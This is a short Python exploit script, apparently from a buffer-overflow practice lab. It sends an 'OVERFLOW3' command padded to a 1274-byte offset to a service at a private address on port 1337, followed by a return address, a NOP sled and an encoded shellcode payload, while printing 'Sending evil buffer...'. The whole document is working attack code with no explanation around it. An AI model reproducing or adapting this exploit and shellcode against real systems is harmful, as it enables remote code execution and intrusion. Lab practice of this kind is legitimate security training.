#!/usr/bin/python3

import socket

ip = "10.10.240.201"
port = 1337

prefix = "OVERFLOW3 "
offset = 1274
overflow = "A" * offset
retn = "\x03\x12\x50\x62"
padding = "\x90" * 16
payload = ("\xfc\xbb\xd9\xa5\xf6\x6f\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x25\x4d\x74\x6f\xd5"
"\x8e\x19\xf9\x30\xbf\x19\x9d\x31\x90\xa9\xd5\x17\x1d\x41\xbb"
"\x83\x96\x27\x14\xa4\x1f\x8d\x42\x8b\xa0\xbe\xb7\x8a\x22\xbd"
"\xeb\x6c\x1a\x0e\xfe\x6d\x5b\x73\xf3\x3f\x34\xff\xa6\xaf\x31"
"\xb5\x7a\x44\x09\x5b\xfb\xb9\xda\x5a\x2a\x6c\x50\x05\xec\x8f"
"\xb5\x3d\xa5\x97\xda\x78\x7f\x2c\x28\xf6\x7e\xe4\x60\xf7\x2d"
"\xc9\x4c\x0a\x2f\x0e\x6a\xf5\x5a\x66\x88\x88\x5c\xbd\xf2\x56"
"\xe8\x25\x54\x1c\x4a\x81\x64\xf1\x0d\x42\x6a\xbe\x5a\x0c\x6f"
"\x41\x8e\x27\x8b\xca\x31\xe7\x1d\x88\x15\x23\x45\x4a\x37\x72"
"\x23\x3d\x48\x64\x8c\xe2\xec\xef\x21\xf6\x9c\xb2\x2d\x3b\xad"
"\x4c\xae\x53\xa6\x3f\x9c\xfc\x1c\xd7\xac\x75\xbb\x20\xd2\xaf"
"\x7b\xbe\x2d\x50\x7c\x97\xe9\x04\x2c\x8f\xd8\x24\xa7\x4f\xe4"
"\xf0\x68\x1f\x4a\xab\xc8\xcf\x2a\x1b\xa1\x05\xa5\x44\xd1\x26"
"\x6f\xed\x78\xdd\xf8\x18\x7b\xc0\x6d\x74\x81\xfa\x9c\xd9\x0c"
"\x1c\xf4\xf1\x58\xb7\x61\x6b\xc1\x43\x13\x74\xdf\x2e\x13\xfe"
"\xec\xcf\xda\xf7\x99\xc3\x8b\xf7\xd7\xb9\x1a\x07\xc2\xd5\xc1"
"\x9a\x89\x25\x8f\x86\x05\x72\xd8\x79\x5c\x16\xf4\x20\xf6\x04"
"\x05\xb4\x31\x8c\xd2\x05\xbf\x0d\x96\x32\x9b\x1d\x6e\xba\xa7"
"\x49\x3e\xed\x71\x27\xf8\x47\x30\x91\x52\x3b\x9a\x75\x22\x77"
"\x1d\x03\x2b\x52\xeb\xeb\x9a\x0b\xaa\x14\x12\xdc\x3a\x6d\x4e"
"\x7c\xc4\xa4\xca\x9c\x27\x6c\x27\x35\xfe\xe5\x8a\x58\x01\xd0"
"\xc9\x64\x82\xd0\xb1\x92\x9a\x91\xb4\xdf\x1c\x4a\xc5\x70\xc9"
"\x6c\x7a\x70\xd8\x6c\x7c\x8e\xe3")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
